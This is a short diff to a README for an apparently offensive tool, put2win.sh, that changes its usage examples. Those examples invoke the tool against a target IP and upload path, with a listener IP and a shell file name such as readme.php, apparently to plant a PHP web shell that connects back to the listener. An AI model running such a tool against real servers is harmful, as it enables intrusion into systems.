@@ -25,8 +25,8 @@ Options:
   -s SHELL NAME    Shell name (e.g. license.php)
 
 Examples of use:
- - ./put2win.sh -t 192.168.1.80 -u /uploads -l 192.168.1.10 -s readme.php
- - ./put2win.sh -t 192.168.1.80 -p 443 -u /uploads -l 192.168.1.10
+ - bash put2win.sh -t 192.168.1.80 -l 192.168.1.10 -s readme.php
+ - bash put2win.sh -t 192.168.1.80 -p 443 -u /uploads -l 192.168.1.10
  ```
  
 # Contact
